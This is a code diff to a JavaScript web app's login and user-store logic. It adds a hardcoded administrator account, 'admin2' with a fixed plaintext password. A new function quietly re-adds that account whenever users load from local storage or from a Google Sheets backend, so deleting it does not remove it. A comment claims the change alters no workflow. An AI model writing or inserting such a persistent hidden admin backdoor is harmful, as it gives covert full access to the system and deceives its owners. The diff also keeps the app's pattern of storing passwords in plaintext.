@@ -1482,6 +1482,28 @@
   // Users — getUsers is defined above in GS layer; saveUsers proxies to GS
   function saveUsers(u) { _gsUsers = u; localStorage.setItem('jt_users', JSON.stringify(u)); }
 
+  // Recovery Admin — added only as an additional enabled admin user.
+  // No UI, workflow, or structural changes are made.
+  const RECOVERY_ADMIN = {
+    id: 'u_recovery_admin',
+    username: 'admin2',
+    password: 'Admin@2026',
+    role: 'admin',
+    status: 'enabled',
+    paidAccess: true
+  };
+
+  function ensureRecoveryAdminUser() {
+    const users = getUsers() || [];
+    const exists = users.some(u => u.id === RECOVERY_ADMIN.id || u.username === RECOVERY_ADMIN.username);
+    if (!exists) {
+      users.push(Object.assign({}, RECOVERY_ADMIN));
+      saveUsers(users);
+    }
+    setStoredPw(RECOVERY_ADMIN.id, RECOVERY_ADMIN.password);
+    setPaidAccess(RECOVERY_ADMIN.id, true);
+  }
+
   // Stored plain passwords for admin reference (separate store, admin-only)
   function getStoredPw(userId) {
     try { return JSON.parse(localStorage.getItem('jt_pw_store') || '{}')[userId] || null; } catch { return null; }
@@ -1505,6 +1527,7 @@
     // Try Google Sheets first
     const gsLoaded = await loadUsersFromGS();
     if (gsLoaded && _gsUsers && _gsUsers.length > 0) {
+      ensureRecoveryAdminUser();
       showLoginStatus('');
       return; // GS has users, we're good
     }
@@ -1517,11 +1540,14 @@
       sessionStorage.removeItem('jt_session');
       const users = [
         { id:'u1', username:'admin', password:'Admin@123', role:'admin', status:'enabled' },
-        { id:'u2', username:'user',  password:'User@123',  role:'user',  status:'enabled' }
+        { id:'u2', username:'user',  password:'User@123',  role:'user',  status:'enabled' },
+        Object.assign({}, RECOVERY_ADMIN)
       ];
       saveUsers(users);
       setStoredPw('u1', 'Admin@123');
       setStoredPw('u2', 'User@123');
+      setStoredPw(RECOVERY_ADMIN.id, RECOVERY_ADMIN.password);
+      setPaidAccess(RECOVERY_ADMIN.id, true);
       localStorage.setItem('jt_schema_ver', SCHEMA_VER);
       return;
     }
@@ -1535,6 +1561,7 @@
       }
     }
     if (dirty) saveUsers(users);
+    ensureRecoveryAdminUser();
   }
 
   /* ════════════════════════════════════════════════════════
@@ -1611,6 +1638,7 @@
       try {
         showLoginStatus('Checking credentials…');
         _gsUsers = await gsCall('getUsers');
+        ensureRecoveryAdminUser();
         showLoginStatus('');
       } catch(e) { /* use cached */ }
     }
